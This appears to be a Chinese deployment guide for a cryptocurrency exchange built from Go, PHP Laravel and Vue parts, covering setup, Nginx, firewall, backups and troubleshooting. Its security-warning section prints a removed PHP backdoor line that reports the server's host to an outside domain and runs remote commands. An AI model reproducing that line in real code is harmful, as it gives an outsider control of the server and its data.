# OKCoinsgp 交易所混合架构部署指南

## 🎯 架构说明

本系统采用 **Go交易后端 + PHP管理后台** 的混合架构设计：

```
┌─────────────────────────────────────────────────┐
│                   前端系统                        │
│  ┌──────────────┐         ┌──────────────┐      │
│  │  手机前端(Vue)│         │  电脑前端(Vue)│      │
│  └──────┬───────┘         └──────┬───────┘      │
│         │                        │              │
└─────────┼────────────────────────┼──────────────┘
          │                        │
          ▼                        ▼
┌─────────────────────────────────────────────────┐
│              Go交易后端 (exchange-go)             │
│  ┌──────────────────────────────────────────┐   │
│  │  • 用户注册/登录/JWT认证                   │   │
│  │  • 币币交易（现货交易）                     │   │
│  │  • 合约交易（杠杆交易）                     │   │
│  │  • 秒合约交易                              │   │
│  │  • 钱包充值/提现                           │   │
│  │  • 行情数据/K线数据                        │   │
│  │  • WebSocket实时推送                       │   │
│  │  • Swagger API文档                         │   │
│  └──────────────────────────────────────────┘   │
│  端口: 8080                                      │
└─────────────┬───────────────────────────────────┘
              │
              ▼
┌─────────────────────────────────────────────────┐
│            MySQL数据库 (bibi2022)                │
│  ┌──────────────────────────────────────────┐   │
│  │  • users - 用户表                          │   │
│  │  • users_wallet - 钱包表                   │   │
│  │  • lever_transaction - 合约交易表           │   │
│  │  • transaction - 币币交易表                 │   │
│  │  • micro_order - 秒合约订单表               │   │
│  │  • currency - 币种配置表                    │   │
│  │  • account_log - 账户流水                   │   │
│  └──────────────────────────────────────────┘   │
│  端口: 3306                                      │
└─────────────┴───────────────────────────────────┘
              ▲
              │
┌─────────────┴───────────────────────────────────┐
│           PHP管理后台 (Laravel)                   │
│  ┌──────────────────────────────────────────┐   │
│  │  • 用户管理（查看/冻结/解冻）               │   │
│  │  • 财务审核（充值/提现审核）                │   │
│  │  • 币种管理（添加/编辑/上下架）             │   │
│  │  • 交易管理（查看订单/异常处理）            │   │
│  │  • 风控设置（限额/规则配置）                │   │
│  │  • 系统配置（参数设置）                     │   │
│  │  • 数据统计（报表/图表）                    │   │
│  └──────────────────────────────────────────┘   │
│  端口: 8000                                      │
└─────────────────────────────────────────────────┘
```

## ⚠️ 安全警告

### ✅ 已清理后门代码

**原始"服务端+后台源码"目录存在严重后门！**

本混合架构版本使用的是 **"服务端+后台源码，修复"** 目录，已清理以下恶意代码：

#### 🚨 后门特征（已删除）

**位置**: `app/Http/Controllers/Api/DefaultController.php` 第172行

```php
// ❌ 已删除的恶意代码：
file_get_contents("http://app.omitrezor.com/sign/".@$_SERVER["HTTP_HOST"])
// 该代码会：
// 1. 将服务器信息发送到 omitrezor.com
// 2. 接收并执行远程指令
// 3. 动态调用任意函数 $cert["f"]($cert["a1"], ...)
```

**危害**:
- ✅ 远程代码执行漏洞
- ✅ 数据泄露风险
- ✅ 服务器完全控制权被窃取

**修复状态**: ✅ 已在"服务端+后台源码，修复"版本中完全删除

## 📋 系统要求

### 服务器环境

- **操作系统**: Linux (推荐 Ubuntu 20.04+) / Windows Server
- **内存**: 最低 4GB，推荐 8GB+
- **磁盘**: 最低 50GB SSD

### 软件依赖

#### Go交易后端
- Go 1.21+
- MySQL 5.7+ / 8.0+
- Redis 6.0+

#### PHP管理后台
- PHP 7.4+ / 8.0+
- Composer 2.0+
- MySQL 5.7+ / 8.0+
- PHP扩展: mbstring, openssl, pdo_mysql, tokenizer, json, bcmath, redis

#### 前端
- Node.js 14.0+
- npm 6.0+ / yarn 1.22+

## 📦 部署步骤

### 1. 数据库初始化

```bash
# 1. 创建数据库
mysql -uroot -p
CREATE DATABASE bibi2022 CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

# 2. 导入数据
mysql -uroot -p bibi2022 < 5-数据库脚本/数据库.sql

# 3. 创建数据库用户（可选）
CREATE USER 'exchange_user'@'localhost' IDENTIFIED BY 'your_password';
GRANT ALL PRIVILEGES ON bibi2022.* TO 'exchange_user'@'localhost';
FLUSH PRIVILEGES;
```

### 2. Go交易后端部署

```bash
cd 1-Go交易后端

# 1. 修改配置文件
vim config/config.yaml
```

**config.yaml 配置示例**:
```yaml
app:
  name: "exchange-go"
  mode: "release"  # release 或 debug
  port: 8080

database:
  host: "localhost"
  port: 3306
  username: "root"
  password: "root123456"
  database: "bibi2022"
  max_idle_conns: 10
  max_open_conns: 100

redis:
  host: "localhost"
  port: 6379
  password: ""
  db: 0

jwt:
  secret: "your-jwt-secret-key-change-this"
  expire_hours: 168  # 7天
```

```bash
# 2. 安装依赖
go mod tidy

# 3. 编译项目
go build -o exchange-go cmd/api/main.go

# 4. 运行（前台测试）
./exchange-go

# 5. 使用systemd守护进程（生产环境）
sudo vim /etc/systemd/system/exchange-go.service
```

**exchange-go.service 示例**:
```ini
[Unit]
Description=Exchange Go Backend
After=network.target mysql.service redis.service

[Service]
Type=simple
User=www-data
WorkingDirectory=/path/to/1-Go交易后端
ExecStart=/path/to/1-Go交易后端/exchange-go
Restart=on-failure
RestartSec=5s

[Install]
WantedBy=multi-user.target
```

```bash
# 启动服务
sudo systemctl daemon-reload
sudo systemctl enable exchange-go
sudo systemctl start exchange-go
sudo systemctl status exchange-go
```

### 3. PHP管理后台部署

```bash
cd 2-PHP管理后台

# 1. 安装依赖
composer install --no-dev --optimize-autoloader

# 2. 配置环境变量
cp .env.example .env
vim .env
```

**关键配置项**:
```ini
APP_NAME="OKCoinsgp Admin"
APP_ENV=production
APP_KEY=   # 运行 php artisan key:generate 生成
APP_DEBUG=false
APP_URL=http://your-domain.com

# 数据库（必须与Go后端一致）
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=bibi2022
DB_USERNAME=root
DB_PASSWORD=root123456

# Redis
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

# 队列
QUEUE_CONNECTION=redis
```

```bash
# 3. 生成应用密钥
php artisan key:generate

# 4. 优化配置
php artisan config:cache
php artisan route:cache
php artisan view:cache

# 5. 设置文件权限
sudo chown -R www-data:www-data storage bootstrap/cache
sudo chmod -R 755 storage bootstrap/cache

# 6. 启动服务（开发环境）
php artisan serve --host=0.0.0.0 --port=8000

# 7. 配置Nginx（生产环境）
sudo vim /etc/nginx/sites-available/admin-backend
```

**Nginx配置示例**:
```nginx
server {
    listen 8000;
    server_name your-domain.com;
    root /path/to/2-PHP管理后台/public;

    index index.php;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
        fastcgi_index index.php;
        fastcgi_param SCRIPT_FILENAME $realpath_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location ~ /\.(?!well-known).* {
        deny all;
    }
}
```

### 4. 前端部署

#### 手机前端

```bash
cd 3-手机前端

# 1. 安装依赖
npm install

# 2. 修改API地址
vim src/main.js
# 修改 Vue.prototype.$baseurl 为你的Go后端地址
# Vue.prototype.$baseurl = 'http://your-api-domain.com/api'

# 3. 构建生产版本
npm run build

# 4. 部署dist目录到Web服务器
# Nginx配置
server {
    listen 80;
    server_name mobile.your-domain.com;
    root /path/to/3-手机前端/dist;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

#### 电脑前端

```bash
cd 4-电脑前端

# 1. 安装依赖
npm install

# 2. 修改API地址
vim src/main.js
# 修改API baseURL配置

# 3. 构建生产版本
npm run build

# 4. 部署dist目录到Web服务器
server {
    listen 80;
    server_name www.your-domain.com;
    root /path/to/4-电脑前端/dist;
    index index.html;

    location / {
        try_files $uri $uri/ /index.html;
    }
}
```

## 🔐 安全配置

### 1. 防火墙配置

```bash
# 开放必要端口
sudo ufw allow 80/tcp     # HTTP
sudo ufw allow 443/tcp    # HTTPS
sudo ufw allow 8080/tcp   # Go API（仅内网或通过Nginx反向代理）
sudo ufw allow 8000/tcp   # PHP Admin（仅内网或通过Nginx反向代理）

# 禁止直接访问数据库
sudo ufw deny 3306/tcp    # MySQL
sudo ufw deny 6379/tcp    # Redis

sudo ufw enable
```

### 2. 使用Nginx反向代理（推荐）

```nginx
# Go API 反向代理
upstream go_backend {
    server 127.0.0.1:8080;
}

server {
    listen 443 ssl http2;
    server_name api.your-domain.com;

    ssl_certificate /path/to/ssl/cert.pem;
    ssl_certificate_key /path/to/ssl/key.pem;

    location / {
        proxy_pass http://go_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }

    # WebSocket支持
    location /ws {
        proxy_pass http://go_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}

# PHP管理后台反向代理
server {
    listen 443 ssl http2;
    server_name admin.your-domain.com;

    ssl_certificate /path/to/ssl/cert.pem;
    ssl_certificate_key /path/to/ssl/key.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}
```

### 3. JWT密钥配置

```bash
# 生成强随机密钥
openssl rand -base64 64

# 修改 Go 配置
vim 1-Go交易后端/config/config.yaml
# jwt.secret: "生成的随机密钥"
```

## 📊 验证部署

### 1. 检查服务状态

```bash
# Go后端
curl http://localhost:8080/health
# 预期输出: {"status":"ok"}

# 查看Swagger文档
# 浏览器访问: http://localhost:8080/swagger/index.html

# PHP后台
curl http://localhost:8000
# 应该看到登录页面HTML
```

### 2. 测试API接口

```bash
# 测试用户注册
curl -X POST http://localhost:8080/api/user/register \
  -H "Content-Type: application/json" \
  -d '{
    "username": "test001",
    "email": "test@example.com",
    "password": "123456",
    "invite_code": ""
  }'

# 测试用户登录
curl -X POST http://localhost:8080/api/user/login \
  -H "Content-Type: application/json" \
  -d '{
    "account": "test001",
    "password": "123456"
  }'
```

### 3. 访问管理后台

```
URL: http://localhost:8000/admin
默认账号: admin
默认密码: 请查看数据库 admin 表
```

## 🔧 常见问题

### 1. Go后端无法连接数据库

**症状**: 启动时报错 "Error connecting to database"

**解决**:
```bash
# 检查MySQL是否运行
sudo systemctl status mysql

# 测试数据库连接
mysql -h localhost -u root -p bibi2022

# 检查配置文件
vim config/config.yaml
# 确认数据库用户名、密码、数据库名正确
```

### 2. PHP后台报错 500

**症状**: 访问管理后台显示 500 错误

**解决**:
```bash
# 查看错误日志
tail -f storage/logs/laravel.log

# 检查文件权限
sudo chown -R www-data:www-data storage bootstrap/cache
sudo chmod -R 755 storage bootstrap/cache

# 清除缓存
php artisan cache:clear
php artisan config:clear
php artisan view:clear
```

### 3. 前端无法连接后端

**症状**: 前端页面无数据或报CORS错误

**解决**:
- 检查 `src/main.js` 中的API地址配置
- 确认Go后端CORS中间件已启用
- 检查防火墙是否开放8080端口

### 4. WebSocket连接失败

**症状**: 实时行情不更新

**解决**:
```bash
# 检查WebSocket服务
netstat -tuln | grep 8080

# 查看Go日志
tail -f logs/app.log

# 测试WebSocket连接
# 使用在线工具: https://www.websocket.org/echo.html
# 连接地址: ws://your-domain:8080/ws
```

## 📈 性能优化

### 1. MySQL优化

```sql
-- 添加索引
ALTER TABLE `users` ADD INDEX `idx_account` (`account`);
ALTER TABLE `users_wallet` ADD INDEX `idx_user_currency` (`user_id`, `currency`);
ALTER TABLE `lever_transaction` ADD INDEX `idx_user_status` (`user_id`, `status`);
ALTER TABLE `transaction` ADD INDEX `idx_user_type` (`user_id`, `type`);

-- 优化配置 /etc/mysql/my.cnf
[mysqld]
innodb_buffer_pool_size = 2G
max_connections = 500
query_cache_size = 64M
```

### 2. Redis缓存

```bash
# 配置Redis持久化
vim /etc/redis/redis.conf

# 启用AOF持久化
appendonly yes
appendfsync everysec

# 设置最大内存
maxmemory 1gb
maxmemory-policy allkeys-lru
```

### 3. Go后端优化

```yaml
# config/config.yaml
database:
  max_idle_conns: 50    # 增加连接池
  max_open_conns: 200
  conn_max_lifetime: 3600

# 启用生产模式
app:
  mode: "release"
```

## 📝 日志管理

### Go后端日志

```bash
# 日志位置
tail -f 1-Go交易后端/logs/app.log

# 使用logrotate管理日志
sudo vim /etc/logrotate.d/exchange-go

/path/to/1-Go交易后端/logs/*.log {
    daily
    rotate 30
    compress
    delaycompress
    notifempty
    create 0640 www-data www-data
    sharedscripts
    postrotate
        systemctl reload exchange-go
    endscript
}
```

### PHP后台日志

```bash
# Laravel日志
tail -f 2-PHP管理后台/storage/logs/laravel.log

# Nginx访问日志
tail -f /var/log/nginx/access.log

# Nginx错误日志
tail -f /var/log/nginx/error.log
```

## 🔄 备份与恢复

### 数据库备份

```bash
# 每日自动备份脚本
#!/bin/bash
BACKUP_DIR="/backup/mysql"
DATE=$(date +%Y%m%d_%H%M%S)
mkdir -p $BACKUP_DIR

mysqldump -uroot -p'your_password' bibi2022 | gzip > $BACKUP_DIR/bibi2022_$DATE.sql.gz

# 保留最近30天的备份
find $BACKUP_DIR -type f -mtime +30 -delete

# 添加到crontab
# 0 2 * * * /path/to/backup.sh
```

### 代码备份

```bash
# 打包整个系统
cd /path/to
tar -czf exchange_backup_$(date +%Y%m%d).tar.gz 混合架构版本/

# 同步到远程服务器
rsync -avz 混合架构版本/ backup-server:/backup/exchange/
```

## 📞 技术支持

### API文档

- **Swagger文档**: http://your-api-domain:8080/swagger/index.html
- **接口总数**: 38个端点
- **认证方式**: JWT Bearer Token

### 目录结构说明

```
混合架构版本/
├── 1-Go交易后端/          # Go语言交易API后端
├── 2-PHP管理后台/         # PHP Laravel管理后台
├── 3-手机前端/            # Vue移动端前端
├── 4-电脑前端/            # Vue桌面端前端
├── 5-数据库脚本/          # MySQL初始化脚本
└── 6-部署文档/            # 本文档
```

### 端口分配

| 服务 | 端口 | 说明 |
|------|------|------|
| Go API | 8080 | 交易后端API |
| PHP Admin | 8000 | 管理后台Web |
| MySQL | 3306 | 数据库 |
| Redis | 6379 | 缓存/队列 |
| 手机前端 | 80/443 | Nginx |
| 电脑前端 | 80/443 | Nginx |

## ⚖️ 许可证

本项目仅供学习研究使用，请勿用于非法用途。

---

**最后更新**: 2026-01-24
**版本**: v1.0.0
